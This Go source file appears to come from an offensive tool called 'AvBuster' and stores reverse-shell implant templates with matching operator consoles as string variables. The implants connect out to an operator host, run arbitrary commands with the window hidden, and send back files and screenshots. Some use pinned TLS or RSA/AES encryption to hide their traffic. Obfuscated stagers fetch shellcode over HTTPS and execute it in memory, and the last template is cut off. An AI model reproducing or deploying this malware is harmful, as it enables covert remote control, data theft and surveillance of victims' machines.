package binarytemplates

var AvBusterTCPSimpleGoReverseShell = `package main

import (
	"fmt"
	"image/png"
	"io"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"path/filepath"

	"github.com/kbinani/screenshot"
)

//BUFFSIZE is the buffer for communication
const BUFFSIZE = 512

//MANAGERIP connection string to the manager
const MANAGERIP = "REVIPPORT"

func main() {

	conn, err := net.Dial("tcp", MANAGERIP)
	if err != nil {
		fmt.Println(err)
	}

	getshell(conn)

}

func getshell(conn net.Conn) {
	var cmdbuff []byte
	var command string
	cmdbuff = make([]byte, BUFFSIZE)
	var osshell string
	for {
		recvdbytes, _ := conn.Read(cmdbuff[0:])
		command = string(cmdbuff[0:recvdbytes])
		if strings.Index(command, "bye") == 0 {
			conn.Write([]byte("Shell Disconnected"))
			conn.Close()
			os.Exit(0)
		} else if strings.Index(command, "get") == 0 {
			fname := strings.Split(command, " ")[1]
			fmt.Println(fname)
			finflag := make(chan string)
			go sendFile(conn, fname, finflag)
			//<-finflag

		} else if strings.Index(command, "grabscreen") == 0 {
			filenames := getscreenshot()
			finflag := make(chan string)
			for _, fname := range filenames {
				go sendFile(conn, fname, finflag)
				<-finflag
				go removetempimages(filenames, finflag)
				//<-finflag

			}

		} else {
			//endcmd := "END"
			j := 0
			osshellargs := []string{"/C", command}

			if runtime.GOOS == "linux" {
				osshell = "/bin/sh"
				osshellargs = []string{"-c", command}

			} else {
				osshell = "cmd"
				//cmdout, _ := exec.Command("cmd", "/C", command).Output()
			}
			execcmd := exec.Command(osshell, osshellargs...)

			/*if runtime.GOOS == "windows" {
				execcmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			}*/

			cmdout, _ := execcmd.Output()
			if len(cmdout) <= 512 {
				conn.Write([]byte(cmdout))
				//conn.Write([]byte(endcmd))
			} else {

				i := BUFFSIZE
				for {
					if i > len(cmdout) {

						conn.Write(cmdout[j:len(cmdout)])
						break
					} else {

						conn.Write(cmdout[j:i])
						j = i
					}
					i = i + BUFFSIZE
				}

			}

			cmdout = cmdout[:0]
		}

	}
}

func removetempimages(filenames []string, finflag chan string) {
	for _, name := range filenames {
		os.Remove(name)
	}
}

func sendFile(revConn net.Conn, fname string, finflag chan string) {

	file, _ := os.Open(strings.TrimSpace(fname))
	fileInfo, err := file.Stat()
	if err != nil {
		fmt.Println(err)
		return
	}
	fileSize := padString(strconv.FormatInt(fileInfo.Size(), 10), 10)
	fileName := padString(fileInfo.Name(), 64)
	//Sending filename and filesize
	revConn.Write([]byte(fileSize))
	revConn.Write([]byte(fileName))
	sendBuffer := make([]byte, BUFFSIZE)
	//sending file contents
	for {
		_, err = file.Read(sendBuffer)
		if err == io.EOF {
			break
		}
		revConn.Write(sendBuffer)
	}
	finflag <- "file sent"

	//Completed file sending
	return
}

func padString(retunString string, toLength int) string {
	for {
		lengtString := len(retunString)
		if lengtString < toLength {
			retunString = retunString + ":"
			continue
		}
		break
	}
	return retunString
}
func getscreenshot() []string {
	n := screenshot.NumActiveDisplays()
	filenames := []string{}
	var fpth string
	for i := 0; i < n; i++ {
		bounds := screenshot.GetDisplayBounds(i)

		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			panic(err)
		}
		if runtime.GOOS == "windows" {
			fpth = filepath.FromSlash("C:\\Windows\\Temp\\")
		} else {
			fpth = filepath.FromSlash("//tmp//")
		}
		fileName := fmt.Sprintf("Scr-%d-%dx%d.png", i, bounds.Dx(), bounds.Dy())
		fullpath := fpth + fileName
		filenames = append(filenames, fullpath)
		file, _ := os.Create(fullpath)

		defer file.Close()
		png.Encode(file, img)

		//fmt.Printf("#%d : %v \"%s\"\n", i, bounds, fileName)
	}
	return filenames
}`
var AvBusterTCPSimpleGoReverseShellManager = `package main

import (
	"bufio"
	"fmt"
	"io"
	"net"
	"os"
	"strconv"
	"strings"

	"github.com/fatih/color"
)

// FILEREADBUFFSIZE Sets limit for reading file transfer buffer.
const FILEREADBUFFSIZE = 512

//PORT set server port here
const LOCALPORT = ":REVPRT"

func main() {
	redc := color.New(color.FgHiRed, color.Bold)
	greenc := color.New(color.FgHiGreen, color.Bold)
	cyanc := color.New(color.FgCyan, color.Bold)

	var recvdcmd [512]byte //stores output from reverse shell
	//sleepy := html.UnescapeString("&#" + strconv.Itoa(128564) + ";") //emoticons https://apps.timwhitlock.info/emoji/tables/unicode
	//sleepy := emoji.Sprint(":sleeping:")

	cyanc.Println("Not Yet Connected ...")
	listner, _ := net.Listen("tcp", LOCALPORT)
	conn, _ := listner.Accept()
	for {
		reader := bufio.NewReader(os.Stdin)
		redc.Print("[AvBusterTCP]")
		command, _ := reader.ReadString('\n')
		if strings.Compare(command, "bye") == 0 {
			conn.Write([]byte(command))
			conn.Close()
			os.Exit(1)
		} else if strings.Index(command, "get") == 0 {
			getFilewithNameandSize(conn, command)

		} else if strings.Index(command, "grabscreen") == 0 {
			getFilewithNameandSize(conn, command)

		} else {
			conn.Write([]byte(command))
			for {
				chunkbytes, _ := conn.Read(recvdcmd[0:])
				//fmt.Println(string(recvdcmd[0:n]))
				//if string(recvdcmd[0:n]) == "END"
				if chunkbytes < 512 {
					//finaloutput = string(recvdcmd[0:chunkbytes]) + finaloutput
					greenc.Println(string(recvdcmd[0:chunkbytes]))
					break
				} else {
					greenc.Println(string(recvdcmd[0:chunkbytes]))

				}
			}
		}

	}

}

func getFilewithNameandSize(connection net.Conn, command string) {

	connection.Write([]byte(command))

	bufferFileName := make([]byte, 64)
	bufferFileSize := make([]byte, 10)

	connection.Read(bufferFileSize)

	fileSize, _ := strconv.ParseInt(strings.Trim(string(bufferFileSize), ":"), 10, 64)
	fmt.Println("file size ", fileSize)

	connection.Read(bufferFileName)
	fileName := strings.Trim(string(bufferFileName), ":")

	fmt.Println("file name ", fileName)

	newFile, err := os.Create(fileName)

	if err != nil {
		fmt.Println(err)
	}
	defer newFile.Close()
	var receivedBytes int64

	for {
		if (fileSize - receivedBytes) < FILEREADBUFFSIZE {
			io.CopyN(newFile, connection, (fileSize - receivedBytes))
			connection.Read(make([]byte, (receivedBytes+FILEREADBUFFSIZE)-fileSize))
			break
		}
		io.CopyN(newFile, connection, FILEREADBUFFSIZE)
		receivedBytes += FILEREADBUFFSIZE
	}
	fmt.Println("File Download Completed ! ")
	return
}`

var AvBusterHttpsPinnedCertReverseShell = `package main

import (
	"bytes"
	"crypto/sha256"
	"crypto/tls"
	"encoding/hex"
	"fmt"
	"image/png"
	"io"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"syscall"
	"path/filepath"
	"github.com/kbinani/screenshot"
)

//BUFFSIZE is the buffer for communication
const BUFFSIZE = 512

//MASKMANAGERIP connection string to the maskmanager
const MASKMANAGERIP = "REVIPPORT"

//PINNEDFPRINT fingerprint pinning to escape from MITM
const PINNEDKEY = "FPRINT"

func main() {
	fingerprint := strings.Replace(PINNEDKEY, ":", "", -1)
	fingerprintbytes, err := hex.DecodeString(fingerprint)
	if err != nil {
		fmt.Println(err)
	}
	tlsconfig := &tls.Config{InsecureSkipVerify: true}
	conn, err := tls.Dial("tcp", MASKMANAGERIP, tlsconfig)
	if err != nil {
		fmt.Println(err)
	}
	pinnedcertmatched := pinnedcertcheck(conn, fingerprintbytes)
	if pinnedcertmatched {
		getmaskedshell(conn)
	} else {
		fmt.Println("cert problem")
		os.Exit(1)
	}

}

func pinnedcertcheck(conn *tls.Conn, pinnedcert []byte) bool {
	certmatched := false
	for _, peercert := range conn.ConnectionState().PeerCertificates {
		//pubkeybytes, err := x509.MarshalPKIXPublicKey(peercert.PublicKey)
		hash := sha256.Sum256(peercert.Raw)
		if bytes.Compare(hash[0:], pinnedcert) == 0 {
			certmatched = true
		}
	}
	return certmatched
}

func getscreenshot() []string {
	n := screenshot.NumActiveDisplays()
	filenames := []string{}
	var fpth string
	for i := 0; i < n; i++ {
		bounds := screenshot.GetDisplayBounds(i)

		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			panic(err)
		}
		if runtime.GOOS == "windows" {
			fpth = filepath.FromSlash("C:\\Windows\\Temp\\")
		} else {
			fpth = filepath.FromSlash("//tmp//")
		}
		fileName := fmt.Sprintf("maskScr-%d-%dx%d.png", i, bounds.Dx(), bounds.Dy())
		fullpath := fpth + fileName
		filenames = append(filenames, fullpath)
		file, _ := os.Create(fullpath)

		defer file.Close()
		png.Encode(file, img)

		//fmt.Printf("#%d : %v \"%s\"\n", i, bounds, fileName)
	}
	return filenames
}

func getmaskedshell(conn *tls.Conn) {
	var cmdbuff []byte
	var command string
	cmdbuff = make([]byte, BUFFSIZE)
	var osshell string
	//fmt.Println("Welcome to Mask")
	for {
		recvdbytes, _ := conn.Read(cmdbuff[0:])
		command = string(cmdbuff[0:recvdbytes])
		if strings.Index(command, "bye") == 0 {
			conn.Write([]byte("Good Bye !"))
			conn.Close()
			os.Exit(0)
		} else if strings.Index(command, "get") == 0 {
			fname := strings.Split(command, " ")[1]
			fmt.Println(fname)
			finflag := make(chan string)
			go sendFile(conn, fname, finflag)
			//<-finflag

		} else if strings.Index(command, "grabscreen") == 0 {
			filenames := getscreenshot()
			finflag := make(chan string)
			for _, fname := range filenames {
				go sendFile(conn, fname, finflag)
				<-finflag
				go removetempimages(filenames, finflag)
				//<-finflag

			}

		} else {
			//endcmd := "END"
			j := 0
			osshellargs := []string{"/C", command}

			if runtime.GOOS == "linux" {
				osshell = "/bin/sh"
				osshellargs = []string{"-c", command}

			} else {
				osshell = "cmd"
				//cmdout, _ := exec.Command("cmd", "/C", command).Output()
			}
			execcmd := exec.Command(osshell, osshellargs...)

			if runtime.GOOS == "windows" {
				execcmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			}

			cmdout, _ := execcmd.Output()
			if len(cmdout) <= 512 {
				conn.Write([]byte(cmdout))
				//conn.Write([]byte(endcmd))
			} else {
				//fmt.Println(len(cmdout))
				//fmt.Println(string(cmdout))
				//fmt.Println("Length of string :")
				//fmt.Println(len(string(cmdout)))
				i := BUFFSIZE
				for {
					if i > len(cmdout) {
						//fmt.Println("From " + strconv.Itoa(j) + "to" + strconv.Itoa(len(cmdout)))
						//fmt.Println(string(cmdout[j:len(cmdout)]))
						conn.Write(cmdout[j:len(cmdout)])
						break
					} else {
						//fmt.Println("From " + strconv.Itoa(j) + "to" + strconv.Itoa(i))
						//fmt.Println(string(cmdout[j:i]))
						conn.Write(cmdout[j:i])
						j = i
					}
					i = i + BUFFSIZE
				}

			}

			cmdout = cmdout[:0]
		}

	}
}

func removetempimages(filenames []string, finflag chan string) {
	for _, name := range filenames {
		os.Remove(name)
	}
}

func sendFile(revConn net.Conn, fname string, finflag chan string) {

	file, _ := os.Open(strings.TrimSpace(fname))
	fileInfo, err := file.Stat()
	if err != nil {
		fmt.Println(err)
		return
	}
	fileSize := padString(strconv.FormatInt(fileInfo.Size(), 10), 10)
	fileName := padString(fileInfo.Name(), 64)
	//Sending filename and filesize
	revConn.Write([]byte(fileSize))
	revConn.Write([]byte(fileName))
	sendBuffer := make([]byte, BUFFSIZE)
	//sending file contents
	for {
		_, err = file.Read(sendBuffer)
		if err == io.EOF {
			break
		}
		revConn.Write(sendBuffer)
	}
	finflag <- "file sent"

	//Completed file sending
	return
}

func padString(retunString string, toLength int) string {
	for {
		lengtString := len(retunString)
		if lengtString < toLength {
			retunString = retunString + ":"
			continue
		}
		break
	}
	return retunString
}`

var AvBusterHttpsPinnedCertReverseShellManager = `package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"io"
	"net"
	"os"
	"strconv"
	"strings"

	"github.com/fatih/color"
)

// FILEREADBUFFSIZE Sets limit for reading file transfer buffer.
const FILEREADBUFFSIZE = 512

//PORT set server port here
const LOCALPORT = ":REVPRT"

func main() {
	redc := color.New(color.FgHiRed, color.Bold)
	greenc := color.New(color.FgHiGreen, color.Bold)
	cyanc := color.New(color.FgCyan, color.Bold)

	var recvdcmd [512]byte //stores output from reverse shell
	cert, err := tls.LoadX509KeyPair("server.crt", "server.key")
	if err != nil {
		fmt.Println(err)
	}
	tlsconfig := &tls.Config{Certificates: []tls.Certificate{cert}}
	cyanc.Println("Wait for the Tunnell ... ZzzZZ")
	listner, _ := tls.Listen("tcp", LOCALPORT, tlsconfig)
	conn, _ := listner.Accept()
	for {
		reader := bufio.NewReader(os.Stdin)
		redc.Print("[AvBusterPinnedCertShell]")
		command, _ := reader.ReadString('\n')
		if strings.Compare(command, "bye") == 0 {
			conn.Write([]byte(command))
			conn.Close()
			os.Exit(1)
		} else if strings.Index(command, "get") == 0 {
			getFilewithNameandSize(conn, command)

		} else if strings.Index(command, "grabscreen") == 0 {
			getFilewithNameandSize(conn, command)

		} else {
			conn.Write([]byte(command))
			for {
				chunkbytes, _ := conn.Read(recvdcmd[0:])
				//fmt.Println(string(recvdcmd[0:n]))
				//if string(recvdcmd[0:n]) == "END"
				if chunkbytes < 512 {
					//finaloutput = string(recvdcmd[0:chunkbytes]) + finaloutput
					greenc.Println(string(recvdcmd[0:chunkbytes]))
					break
				} else {
					greenc.Println(string(recvdcmd[0:chunkbytes]))

				}
			}
		}

	}

}

func getFilewithNameandSize(connection net.Conn, command string) {

	connection.Write([]byte(command))

	bufferFileName := make([]byte, 64)
	bufferFileSize := make([]byte, 10)

	connection.Read(bufferFileSize)

	fileSize, _ := strconv.ParseInt(strings.Trim(string(bufferFileSize), ":"), 10, 64)
	fmt.Println("file size ", fileSize)

	connection.Read(bufferFileName)
	fileName := strings.Trim(string(bufferFileName), ":")

	fmt.Println("file name ", fileName)

	newFile, err := os.Create(fileName)

	if err != nil {
		fmt.Println(err)
	}
	defer newFile.Close()
	var receivedBytes int64

	for {
		if (fileSize - receivedBytes) < FILEREADBUFFSIZE {
			io.CopyN(newFile, connection, (fileSize - receivedBytes))
			connection.Read(make([]byte, (receivedBytes+FILEREADBUFFSIZE)-fileSize))
			break
		}
		io.CopyN(newFile, connection, FILEREADBUFFSIZE)
		receivedBytes += FILEREADBUFFSIZE
	}
	fmt.Println("File Download Completed ! ")
	return
}`

var AvBusterHttpReverseShell = `package main

import (
	"fmt"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"syscall"
	"time"

	"github.com/PuerkitoBio/goquery"
)

func checkerr(err error) {
	if err != nil {
		fmt.Println(err)
	}
}

func main() {

	var osshell string
	//var osshellargs []string
	//fmt.Println("Got a Shadow from ...")
	revserver := "http://REVIPPORT"

	client := &http.Client{}

	for {

		response, err := client.Get(revserver)
		checkerr(err)
		defer response.Body.Close()
		//cnt2, _ := ioutil.ReadAll(response.Body)
		//fmt.Println(string(cnt2))

		doc, err := goquery.NewDocumentFromResponse(response)
		checkerr(err)
		cnt, _ := doc.Find("form div div div input").Attr("value")

		if strings.TrimSpace(cnt) == "" {
			cnt = "ipconfig"
		}
		command := strings.TrimSpace(string(cnt))
		//fmt.Println("Go query")
		//fmt.Println(command)

		if command == "bye" {
			client.PostForm(revserver, url.Values{"cmd": {command}, "cmdres": {"Bye for now !"}})
			os.Exit(0)
		} else {
			osshellargs := []string{"/C", command}
			if runtime.GOOS == "windows" {
				osshell = "cmd"
			} else {
				osshell = "/bin/sh"
				osshellargs = []string{"-c", command}
			}
			execcmd := exec.Command(osshell, osshellargs...)
			if runtime.GOOS == "windows" {
				execcmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			}

			out, _ := execcmd.Output()
			//fmt.Println(string(out))
			client.PostForm(revserver, url.Values{"cmd": {command}, "cmdres": {string(out)}})
			//client.PostForm(revserver, url.Values{"cmd": {command}})
			time.Sleep(3 * time.Second)
		}

	}

}`

var AvBusterHttpReverseShellManager = `package main

import (
	"bufio"
	"fmt"
	"html/template"
	"net/http"
	"os"
	"strings"

	"github.com/fatih/color"
)

type ServCommand struct {
	Command    string
	Commandres string
}

var commandtopost ServCommand
var servtemplate *template.Template

func init() {
	commandtopost = ServCommand{}
	servtemplate = template.Must(template.ParseFiles("templates/servtemplate.html"))
}

func checkerr(err error) {
	if err != nil {
		fmt.Println(err)
	}
}

func main() {
	//fmt.Println("Got shadow from ...")
	http.HandleFunc("/", index)
	err := http.ListenAndServe(":REVPRT", nil)
	checkerr(err)
}

func index(respwrt http.ResponseWriter, req *http.Request) {
	redc := color.New(color.FgHiRed, color.Bold)
	greenc := color.New(color.FgHiGreen, color.Bold)
	cyanc := color.New(color.FgCyan, color.Bold)
	if req.Method == "POST" {
		err := req.ParseForm()
		checkerr(err)
		cmdres := req.Form.Get("cmdres")
		commandtopost.Commandres = cmdres
		redc.Println("You have a message from Victim...")
		greenc.Println(commandtopost.Commandres)
		err = servtemplate.Execute(respwrt, commandtopost)
		checkerr(err)

		//content, _ := ioutil.ReadAll(req.Body)
		//fmt.Println(string(content))
	} else {
		redc.Printf("[AvBusterHTTPShell]")
		reader := bufio.NewReader(os.Stdin)
		cmdtopost, _ := reader.ReadString('\n')
		cyanc.Println("You sent " + "\"" + strings.TrimRight(cmdtopost, "\r\n") + "\"" + " to client.")
		commandtopost.Command = cmdtopost
		err := servtemplate.Execute(respwrt, commandtopost)
		checkerr(err)
	}
}`

var AvBusterTCPHybridReverseShell = `package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/pem"
	"errors"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"syscall"
)

//BUFFSIZE is the buffer for communication
const BUFFSIZE = 512

//MASKMANAGERIP connection string to the maskmanager
const MASKMANAGERIP = "REVIPPORT"

//PUBLIC KEY
var MNGRPUBLICKEY = []byte("PUBKEY")

//PRIVATE KEY
var PRIVATEKEY = []byte("PVTKEY")

func main() {
	conn, err := net.Dial("tcp", MASKMANAGERIP)
	if err != nil {
		fmt.Println(err)
	}
	getmaskedshell(conn)

}

func encryptconnection(keyval, texttoencrypt string) string {
	//fmt.Println("Encryption Program v0.01")

	text := []byte(texttoencrypt)
	key := []byte(keyval)

	// generate a new aes cipher using our 32 byte long key
	cipherBlock, err := aes.NewCipher(key)
	// if there are any errors, handle them
	if err != nil {
		fmt.Println(err)
	}

	// gcm or Galois/Counter Mode, is a mode of operation
	// for symmetric key cryptographic block ciphers
	// - https://en.wikipedia.org/wiki/Galois/Counter_Mode
	gcm, err := cipher.NewGCM(cipherBlock)
	// if any error generating new GCM
	// handle them
	if err != nil {
		fmt.Println(err)
	}

	// creates a new byte array the size of the nonce
	// which must be passed to Seal
	nonce := make([]byte, gcm.NonceSize())
	// populates our nonce with a cryptographically secure
	// random sequence
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		fmt.Println(err)
	}

	// here we encrypt our text using the Seal function
	// Seal encrypts and authenticates plaintext, authenticates the
	// additional data and appends the result to dst, returning the updated
	// slice. The nonce must be NonceSize() bytes long and unique for all
	// time, for a given key.
	return string(gcm.Seal(nonce, nonce, text, nil))
}

func decryptconnection(keyval, texttodecrypt string) string {
	key := []byte(keyval)
	ciphertext := []byte(texttodecrypt)
	// if our program was unable to read the file
	// print out the reason why it can't
	c, err := aes.NewCipher(key)
	if err != nil {
		fmt.Println(err)
	}

	gcm, err := cipher.NewGCM(c)
	if err != nil {
		fmt.Println(err)
	}

	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize {
		fmt.Println(err)
	}

	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		fmt.Println(err)
	}
	return (string(plaintext))
}

func encryptMessage(origData []byte) ([]byte, error) {
	block, _ := pem.Decode(MNGRPUBLICKEY)
	if block == nil {
		return nil, errors.New("public key error")
	}
	pubInterface, err := x509.ParsePKIXPublicKey(block.Bytes)
	if err != nil {
		return nil, err
	}
	pub := pubInterface.(*rsa.PublicKey)
	return rsa.EncryptPKCS1v15(rand.Reader, pub, origData)
}

func decryptMessage(ciphertext []byte) ([]byte, error) {
	block, _ := pem.Decode(PRIVATEKEY)
	if block == nil {
		return nil, errors.New("private key error!")
	}
	priv, err := x509.ParsePKCS1PrivateKey(block.Bytes)
	if err != nil {
		return nil, err
	}
	return rsa.DecryptPKCS1v15(rand.Reader, priv, ciphertext)
}

func getmaskedshell(conn net.Conn) {
	var keybuff, cmdbuff []byte
	var command string
	cmdbuff = make([]byte, BUFFSIZE)
	keybuff = make([]byte, 1024)
	var osshell string
	//fmt.Println("Welcome to Mask")

	keybytes, _ := conn.Read(keybuff[0:])
	decryptedkey, err := decryptMessage(keybuff[0:keybytes])
	if err != nil {
		fmt.Println(err)
	}
	keyval := string(decryptedkey)

	for {
		recvdbytes, _ := conn.Read(cmdbuff[0:])
		decryptedcmd := decryptconnection(keyval, string(cmdbuff[0:recvdbytes]))
		command = string(decryptedcmd)
		//fmt.Println(command)
		if strings.Index(command, "bye") == 0 {
			msgtoencrypt := "Good Bye :("
			result := encryptconnection(keyval, msgtoencrypt)
			if err != nil {
				fmt.Println(err)
			}
			conn.Write([]byte(result))
			conn.Close()
			os.Exit(0)
		} else {
			j := 0

			osshellargs := []string{"/C", command}

			if runtime.GOOS == "linux" {
				osshell = "/bin/sh"
				osshellargs = []string{"-c", command}

			} else {
				osshell = "cmd"
			}
			execcmd := exec.Command(osshell, osshellargs...)

			if runtime.GOOS == "windows" {
				execcmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			}

			cmdout, _ := execcmd.Output()
			encresult := encryptconnection(keyval, string(cmdout))
			actualres := []byte(encresult)
			//fmt.Println(decryptconnection(keyval, string(actualres)))
			if len(actualres) <= 512 {
				conn.Write([]byte(actualres))
			} else {

				i := BUFFSIZE
				for {
					if i > len(actualres) {
						conn.Write(actualres[j:len(actualres)])
						break
					} else {

						conn.Write(actualres[j:i])
						j = i
					}
					i = i + BUFFSIZE
				}

			}
			actualres = actualres[:0]
			cmdout = cmdout[:0]
		}

	}
}`

var AvBusterTCPHybridReverseShellManager = `package main

import (
	"bufio"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/pem"
	"errors"
	"fmt"
	"io"
	mathrand "math/rand"
	"net"
	"os"
	"strings"
	"time"

	"github.com/fatih/color"
)

// FILEREADBUFFSIZE Sets limit for reading file transfer buffer.
const FILEREADBUFFSIZE = 512

//const LOCALPORT = ":REVPRT"
const LOCALPORT = ":443"

var SHELLPUBLICKEY = []byte("CLIENTPUBKEY")

func main() {
	redc := color.New(color.FgHiRed, color.Bold)
	greenc := color.New(color.FgHiGreen, color.Bold)
	cyanc := color.New(color.FgCyan, color.Bold)
	var recvdcmd [512]byte
	cyanc.Println("Hybrid Tunnell...")
	listner, _ := net.Listen("tcp", LOCALPORT)
	conn, _ := listner.Accept()
	keyval := generateKey()
	encmsg, _ := encryptMessage([]byte(keyval))
	//fmt.Println(keyval)
	conn.Write(encmsg)
	for {
		reader := bufio.NewReader(os.Stdin)
		redc.Print("[[AvBusterHybridEncryptedShell]]")
		command, _ := reader.ReadString('\n')
		if strings.Compare(command, "bye") == 0 {
			encmsg := []byte(encryptconnection(keyval, command))
			conn.Write(encmsg)
			conn.Close()
			os.Exit(1)
		} else {
			encmsg := []byte(encryptconnection(keyval, command))
			conn.Write(encmsg)
			alldata := make([]byte, 0, 4096) // big buffer

			for {
				chunkbytes, _ := conn.Read(recvdcmd[0:])
				if chunkbytes < 512 {
					//greenc.Println(string(recvdcmd[0:chunkbytes]))
					alldata = append(alldata, recvdcmd[:chunkbytes]...)
					break
				} else {
					//greenc.Println(string(recvdcmd[0:chunkbytes]))
					alldata = append(alldata, recvdcmd[:chunkbytes]...)

				}
			}

			greenc.Println(decryptconnection(keyval, string(alldata)))

		}

	}

}

func encryptconnection(keyval, texttoencrypt string) string {
	//fmt.Println("Encryption Program v0.01")

	text := []byte(texttoencrypt)
	key := []byte(keyval)

	// generate a new aes cipher using our 32 byte long key
	cipherBlock, err := aes.NewCipher(key)
	// if there are any errors, handle them
	if err != nil {
		fmt.Println(err)
	}

	// gcm or Galois/Counter Mode, is a mode of operation
	// for symmetric key cryptographic block ciphers
	// - https://en.wikipedia.org/wiki/Galois/Counter_Mode
	gcm, err := cipher.NewGCM(cipherBlock)
	// if any error generating new GCM
	// handle them
	if err != nil {
		fmt.Println(err)
	}

	// creates a new byte array the size of the nonce
	// which must be passed to Seal
	nonce := make([]byte, gcm.NonceSize())
	// populates our nonce with a cryptographically secure
	// random sequence
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		fmt.Println(err)
	}

	// here we encrypt our text using the Seal function
	// Seal encrypts and authenticates plaintext, authenticates the
	// additional data and appends the result to dst, returning the updated
	// slice. The nonce must be NonceSize() bytes long and unique for all
	// time, for a given key.
	return string(gcm.Seal(nonce, nonce, text, nil))
}
func generateKey() string {
	mathrand.Seed(time.Now().UnixNano())
	var keychars = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789~@#$%^&*()-_=+;:?")
	randomkey := make([]rune, 32)
	for i := range randomkey {
		randomkey[i] = keychars[mathrand.Intn(len(keychars))]
	}
	return string(randomkey)
}

func encryptMessage(origData []byte) ([]byte, error) {
	block, _ := pem.Decode(SHELLPUBLICKEY)
	if block == nil {
		return nil, errors.New("public key error")
	}
	pubInterface, err := x509.ParsePKIXPublicKey(block.Bytes)
	if err != nil {
		return nil, err
	}
	pub := pubInterface.(*rsa.PublicKey)
	return rsa.EncryptPKCS1v15(rand.Reader, pub, origData)
}

func decryptMessage(ciphertext []byte) ([]byte, error) {
	block, _ := pem.Decode(PRIVATEKEY)
	if block == nil {
		return nil, errors.New("private key error!")
	}
	priv, err := x509.ParsePKCS1PrivateKey(block.Bytes)
	if err != nil {
		return nil, err
	}
	return rsa.DecryptPKCS1v15(rand.Reader, priv, ciphertext)
}

func decryptconnection(keyval, texttodecrypt string) string {
	key := []byte(keyval)
	ciphertext := []byte(texttodecrypt)
	// if our program was unable to read the file
	// print out the reason why it can't
	c, err := aes.NewCipher(key)
	if err != nil {
		fmt.Println(err)
	}

	gcm, err := cipher.NewGCM(c)
	if err != nil {
		fmt.Println(err)
	}

	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize {
		fmt.Println(err)
	}

	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		fmt.Println(err)
	}
	return (string(plaintext))
}`

var AvBusterHttpsMeterPreterShell = `package main

import (
	"crypto/tls"
	"io/ioutil"
	"math/rand"
	"net/http"
	"syscall"
	"time"
	"unsafe"
)

var (
	BJyQRxx        = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"
	pYMFdBjbSa     = syscall.NewLazyDLL("kernel32.dll")
	ZfYBeZAwhLGVCi = pYMFdBjbSa.NewProc("HeapCreate")
	NFgqWNprwn     = pYMFdBjbSa.NewProc("HeapAlloc")
)

func vbNnkRqIKJjoiiy(zgSdYoPyPngVpa uintptr) (uintptr, error) {
	zybVOWnivd, _, _ := ZfYBeZAwhLGVCi.Call(0x00040000, zgSdYoPyPngVpa, 0)
	GSJguXKF, _, _ := NFgqWNprwn.Call(zybVOWnivd, 0x00000008, zgSdYoPyPngVpa)
	if GSJguXKF == 0 {
		return 0, nil
	}
	return GSJguXKF, nil
}
func zfRbWRTglU(tGrloqk int, zNuggNPZo []byte) string {
	DOWIcn := rand.New(rand.NewSource(time.Now().UnixNano()))
	var XNFepYCrN []byte
	for YDlDmTwPwQLS := 0; YDlDmTwPwQLS < tGrloqk; YDlDmTwPwQLS++ {
		XNFepYCrN = append(XNFepYCrN, zNuggNPZo[DOWIcn.Intn(len(zNuggNPZo))])
	}
	return string(XNFepYCrN)
}
func wnJAnr(tGrloqk int) string {
	zNuggNPZo := []byte(BJyQRxx)
	return zfRbWRTglU(tGrloqk, zNuggNPZo)
}
func GCVQeHOtb(hDPrqfO, tGrloqk int) string {
	for {
		rTumlWsp := 0
		FevxLalJuLN := wnJAnr(tGrloqk)
		for _, dJrBBcfQ := range []byte(FevxLalJuLN) {
			rTumlWsp += int(dJrBBcfQ)
		}
		if rTumlWsp%0x100 == hDPrqfO {
			return "/" + FevxLalJuLN
		}
	}
}
func main() {
	PryCgiiZsjNE := &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
	ttSZNuLlsgrWRdf := http.Client{Transport: PryCgiiZsjNE}
	lpklyrWfYIx := "https://REVIPPORT"
	gKLxfLnLqzde, _ := ttSZNuLlsgrWRdf.Get(lpklyrWfYIx + GCVQeHOtb(92, 30))
	defer gKLxfLnLqzde.Body.Close()
	JdxPBJgfHDGq, _ := ioutil.ReadAll(gKLxfLnLqzde.Body)
	GSJguXKF, _ := vbNnkRqIKJjoiiy(uintptr(len(JdxPBJgfHDGq)))
	fsoUfeev := (*[990000]byte)(unsafe.Pointer(GSJguXKF))
	for LSjWSoUKjPpYjS, dJrBBcfQ := range JdxPBJgfHDGq {
		fsoUfeev[LSjWSoUKjPpYjS] = dJrBBcfQ
	}
	syscall.Syscall(GSJguXKF, 0, 0, 0, 0)
}
`
var AvBusterHttpMeterPreterShell = `package main

import (
	"io/ioutil"
	"math/rand"
	"net/http"
	"syscall"
	"time"
	"unsafe"
)

const (
	dlIyxUBZRDOnxIB = 0x1000
	oMuJfGUDmtCSRG  = 0x2000
	hvyvVkxdZsQaz   = 0x40
)

var (
	jdaMdbGgeF      = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"
	kernel          = syscall.NewLazyDLL("kernel32.dll")
